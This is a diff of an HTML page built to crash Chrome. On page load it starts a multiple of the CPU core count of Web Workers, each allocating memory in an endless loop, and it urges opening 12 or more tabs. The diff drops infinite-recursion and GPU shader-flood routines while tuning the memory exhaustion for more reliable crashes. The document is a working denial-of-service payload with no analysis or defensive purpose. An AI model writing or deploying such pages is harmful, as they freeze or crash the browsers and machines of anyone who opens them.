@@ -1,50 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Ultimate Chrome System Crash</title>
+    <title>Ultimate Chrome Crash - Reliable Version</title>
 </head>
 <body>
-    <h1>Final Test - Full System Overload</h1>
+    <h1>Final Test - Maximum Chrome Crash</h1>
     <p>Open 12+ tabs for best results.</p>
 
     <script>
         function startWorker() {
-            let code = `let data = []; while (true) { data.push(new Float64Array(1e9)); }`; // Increased memory block size
+            let code = `let data = []; while (true) { data.push(new Float64Array(1e8)); }`; 
             let blob = new Blob([code], { type: "application/javascript" });
             let worker = new Worker(URL.createObjectURL(blob));
         }
 
-        function infiniteRecursion() {
-            try {
-                return infiniteRecursion();
-            } catch (e) {
-                infiniteRecursion();
-            }
-        }
-
-        function overloadGPU() {
-            let canvas = document.createElement('canvas');
-            let gl = canvas.getContext('webgl');
-            function floodGPU() {
-                let shaders = [];
-                setInterval(() => {
-                    var shader = gl.createShader(gl.VERTEX_SHADER);
-                    gl.shaderSource(shader, 'void main() { gl_Position = vec4(0.5, 0.5, 0.5, 1.0); }');
-                    gl.compileShader(shader);
-                    shaders.push(shader);
-                    gl.getShaderParameter(shader, gl.COMPILE_STATUS);
-                }, 1);
-            }
-            floodGPU();
-        }
-
-        let coreMultiplier = navigator.hardwareConcurrency * 8; // Increased to 8x CPU cores
+        let coreMultiplier = navigator.hardwareConcurrency * 6; // Adjusted to 6x CPU cores for stronger execution
         for (let i = 0; i < coreMultiplier; i++) {
-            setTimeout(startWorker, i * 100); // Reduced delay for more rapid execution
+            setTimeout(startWorker, i * 100); // Minimal delay for rapid overload
         }
-
-        setTimeout(() => infiniteRecursion(), 2000); // Start recursion after 2 seconds (sooner)
-        setTimeout(() => overloadGPU(), 2000); // Start GPU flood after 2 seconds
     </script>
 </body>
 </html>
